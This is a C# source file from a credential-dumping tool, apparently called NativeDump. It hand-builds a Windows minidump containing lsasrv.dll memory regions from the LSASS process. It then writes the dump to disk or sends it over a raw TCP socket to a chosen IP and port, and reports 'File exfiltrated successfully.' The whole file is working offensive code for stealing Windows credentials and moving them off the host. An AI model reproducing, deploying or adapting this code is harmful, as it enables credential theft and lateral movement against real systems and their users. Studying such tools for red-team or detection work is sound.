using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Net.Sockets;
using static NativeDump.Win32;


namespace NativeDump
{
    internal class CreateFile
    {
        public static byte[] JoinByteArrays(params byte[][] arrays)
        {
            return arrays.SelectMany(array => array).ToArray();
        }


        public static byte[] StructToByteArray<T>(T structInstance) where T : struct
        {
            int structSize = Marshal.SizeOf(structInstance);
            byte[] byteArray = new byte[structSize];
            IntPtr ptr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(structInstance, ptr, true);
            Marshal.Copy(ptr, byteArray, 0, structSize);
            Marshal.FreeHGlobal(ptr);
            return byteArray;
        }


        public static OSVERSIONINFOEX getBuildNumber()
        {
            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            uint ntstatus = RtlGetVersion(ref osVersionInfo);
            Console.WriteLine("[+] RtlGetVersion NTSTATUS: 0x" + ntstatus.ToString("X"));
            return osVersionInfo;
        }


        public static byte[] CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr)
        {
            Console.WriteLine("");
            Console.WriteLine("[+] === BUILDING MINIDUMP ===");

            // Header
            MinidumpHeader header = new MinidumpHeader();
            header.Signature = 0x504d444d;
            header.Version = 0xa793;
            header.NumberOfStreams = 0x3;
            header.StreamDirectoryRva = 0x20;

            Console.WriteLine("    [+] Header:");
            Console.WriteLine("        Signature:          0x504D444D (MDMP)");
            Console.WriteLine("        Version:            0xA793");
            Console.WriteLine("        NumberOfStreams:     3");
            Console.WriteLine("        StreamDirectoryRva: 0x20 (32 bytes)");

            // Stream Directory
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_1 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_1.StreamType = 4;
            minidumpStreamDirectoryEntry_1.Size = 112;
            minidumpStreamDirectoryEntry_1.Location = 0x7c;

            Console.WriteLine("    [+] Stream Directory Entry 1 (ModuleListStream):");
            Console.WriteLine("        StreamType:  4 (ModuleListStream)");
            Console.WriteLine("        Size:        112 (0x70)");
            Console.WriteLine("        Location:    0x7C (124 bytes)");

            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_2 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_2.StreamType = 7;
            minidumpStreamDirectoryEntry_2.Size = 56;
            minidumpStreamDirectoryEntry_2.Location = 0x44;

            Console.WriteLine("    [+] Stream Directory Entry 2 (SystemInfoStream):");
            Console.WriteLine("        StreamType:  7 (SystemInfoStream)");
            Console.WriteLine("        Size:        56 (0x38)");
            Console.WriteLine("        Location:    0x44 (68 bytes)");

            uint mem64ListSize = (uint)(16 + 16 * mem64info_List.Count);
            MinidumpStreamDirectoryEntry minidumpStreamDirectoryEntry_3 = new MinidumpStreamDirectoryEntry();
            minidumpStreamDirectoryEntry_3.StreamType = 9;
            minidumpStreamDirectoryEntry_3.Size = mem64ListSize;
            minidumpStreamDirectoryEntry_3.Location = 0x12A;

            Console.WriteLine("    [+] Stream Directory Entry 3 (Memory64ListStream):");
            Console.WriteLine("        StreamType:  9 (Memory64ListStream)");
            Console.WriteLine("        Size:        " + mem64ListSize + " (0x" + mem64ListSize.ToString("X") + ")");
            Console.WriteLine("        Location:    0x12A (298 bytes)");

            // SystemInfoStream
            SystemInfoStream systemInfoStream = new SystemInfoStream();
            systemInfoStream.ProcessorArchitecture = 0x9;
            OSVERSIONINFOEX osVersionInfo = getBuildNumber();
            systemInfoStream.MajorVersion = (uint)osVersionInfo.dwMajorVersion;
            systemInfoStream.MinorVersion = (uint)osVersionInfo.dwMinorVersion;
            systemInfoStream.BuildNumber = (uint)osVersionInfo.dwBuildNumber;

            Console.WriteLine("    [+] SystemInfoStream:");
            Console.WriteLine("        ProcessorArchitecture: 9 (AMD64)");
            Console.WriteLine("        MajorVersion:          " + osVersionInfo.dwMajorVersion);
            Console.WriteLine("        MinorVersion:          " + osVersionInfo.dwMinorVersion);
            Console.WriteLine("        BuildNumber:           " + osVersionInfo.dwBuildNumber);

            // ModuleList
            ModuleListStream moduleListStream = new ModuleListStream();
            moduleListStream.NumberOfModules = 1;
            moduleListStream.BaseAddress = lsasrvdll_address;
            moduleListStream.Size = (uint)lsasrvdll_size;
            moduleListStream.PointerName = 0xE8;
            string dll_str = "C:\\Windows\\System32\\lsasrv.dll";
            CUSTOM_UNICODE_STRING dllName = new CUSTOM_UNICODE_STRING();
            dllName.Length = (uint)(dll_str.Length * 2);
            dllName.Buffer = dll_str;

            Console.WriteLine("    [+] ModuleListStream:");
            Console.WriteLine("        NumberOfModules:   1");
            Console.WriteLine("        Module: lsasrv.dll");
            Console.WriteLine("          BaseAddress:     0x" + lsasrvdll_address.ToString("X"));
            Console.WriteLine("          Size:            0x" + lsasrvdll_size.ToString("X") + " (" + lsasrvdll_size + " bytes)");
            Console.WriteLine("          PointerName:     0xE8 (232 bytes)");
            Console.WriteLine("          FullPath:        " + dll_str);
            Console.WriteLine("          UnicodeLength:   " + dllName.Length + " bytes");

            // Memory64List
            int number_of_entries = mem64info_List.Count;
            int offset_mem_regions = 0x12A + 16 + (16 * number_of_entries);
            Memory64ListStream memory64ListStream = new Memory64ListStream();
            memory64ListStream.NumberOfEntries = (ulong)number_of_entries;
            memory64ListStream.MemoryRegionsBaseAddress = (uint)offset_mem_regions;

            Console.WriteLine("    [+] Memory64ListStream:");
            Console.WriteLine("        NumberOfEntries:          " + number_of_entries);
            Console.WriteLine("        MemoryRegionsBaseAddress: 0x" + offset_mem_regions.ToString("X") + " (" + offset_mem_regions + " bytes)");
            Console.WriteLine("        Entry size:               16 bytes each");
            Console.WriteLine("        Total entries size:       " + (16 * number_of_entries) + " bytes");

            byte[] memory64ListStream_byte_arr = StructToByteArray(memory64ListStream);
            for (int i = 0; i < mem64info_List.Count; i++)
            {
                Memory64Info memory64Info = mem64info_List[i];
                memory64ListStream_byte_arr = JoinByteArrays(memory64ListStream_byte_arr, StructToByteArray(memory64Info));
            }

            // Create Minidump file complete byte array
            byte[] header_byte_arr = StructToByteArray(header);
            byte[] streamDirectory_byte_arr = JoinByteArrays(StructToByteArray(minidumpStreamDirectoryEntry_1), StructToByteArray(minidumpStreamDirectoryEntry_2), StructToByteArray(minidumpStreamDirectoryEntry_3));
            byte[] systemInfoStream_byte_arr = StructToByteArray(systemInfoStream);
            byte[] moduleListStream_byte_arr = JoinByteArrays(StructToByteArray(moduleListStream), StructToByteArray(dllName));
            byte[] minidumpFile = JoinByteArrays(header_byte_arr, streamDirectory_byte_arr, systemInfoStream_byte_arr, moduleListStream_byte_arr, memory64ListStream_byte_arr, memoryRegions_byte_arr);

            Console.WriteLine("    [+] Byte array sizes:");
            Console.WriteLine("        Header:             " + header_byte_arr.Length + " bytes");
            Console.WriteLine("        StreamDirectory:    " + streamDirectory_byte_arr.Length + " bytes");
            Console.WriteLine("        SystemInfoStream:   " + systemInfoStream_byte_arr.Length + " bytes");
            Console.WriteLine("        ModuleListStream:   " + moduleListStream_byte_arr.Length + " bytes");
            Console.WriteLine("        Memory64ListStream: " + memory64ListStream_byte_arr.Length + " bytes");
            Console.WriteLine("        MemoryRegions:      " + memoryRegions_byte_arr.Length + " bytes");
            Console.WriteLine("    [+] Total file size: " + minidumpFile.Length + " bytes (" + (minidumpFile.Length / 1024 / 1024) + " MB)");

            return minidumpFile;
        }


        public static void SaveMinidump(byte[] minidumpFile, string dumpfile)
        {
            Console.WriteLine("");
            Console.WriteLine("[+] === SAVING MINIDUMP ===");
            Console.WriteLine("    [+] Output file: " + dumpfile);
            Console.WriteLine("    [+] File size:   " + minidumpFile.Length + " bytes (" + (minidumpFile.Length / 1024 / 1024) + " MB)");
            try
            {
                using (FileStream fs = new FileStream(dumpfile, FileMode.Create))
                {
                    fs.Write(minidumpFile, 0, minidumpFile.Length);
                }
                Console.WriteLine("[+] File " + dumpfile + " created.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] It was not possible to create the file. Exception message: " + ex.Message);
            }
        }


        public static void SendMinidump(byte[] minidumpFile, string ipAddress, int port)
        {
            Console.WriteLine("");
            Console.WriteLine("[+] === SENDING MINIDUMP ===");
            Console.WriteLine("    [+] Target:    " + ipAddress + ":" + port);
            Console.WriteLine("    [+] File size: " + minidumpFile.Length + " bytes (" + (minidumpFile.Length / 1024 / 1024) + " MB)");
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    Console.WriteLine("    [+] Connecting...");
                    socket.Connect(ipAddress, port);
                    Console.WriteLine("    [+] Connected to " + ipAddress + ":" + port);
                    int sent = socket.Send(minidumpFile);
                    Console.WriteLine("    [+] Sent " + sent + " bytes");
                    socket.Shutdown(SocketShutdown.Both);
                }
                Console.WriteLine("[+] File exfiltrated successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error sending file: " + ex.Message);
            }
        }
    }
}
